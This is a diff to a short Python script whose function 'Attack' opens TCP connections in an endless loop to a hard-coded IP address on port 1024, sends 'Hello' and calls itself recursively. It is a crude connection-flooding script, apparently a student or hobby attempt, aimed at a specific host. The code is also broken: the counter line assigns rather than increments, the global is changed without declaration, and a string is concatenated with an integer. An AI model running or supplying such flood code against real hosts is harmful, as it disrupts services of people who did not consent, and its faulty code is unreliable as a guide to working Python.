@@ -1,17 +1,18 @@
-#hi hi
-#hello
 from socket import *
 
-messageSent = 0
+messageSent = 0 #keep track of number of packets sent to server
 
 def Attack():
     while True:
+        #connect to the server
         mySocket = socket(AF_INET, SOCK_STREAM)
         myPort = 1024
         mySocket.connect(("131.229.158.218", myPort))
+        #send packet
         mySocket.send(b"Hello")
-        messageSent+1
-        print(messageSent)
+        messageSent=+1 #update counter
+        print("packets sent: "+messageSent)
+        #recursively call function to keep sending packets
         Attack()
 
 
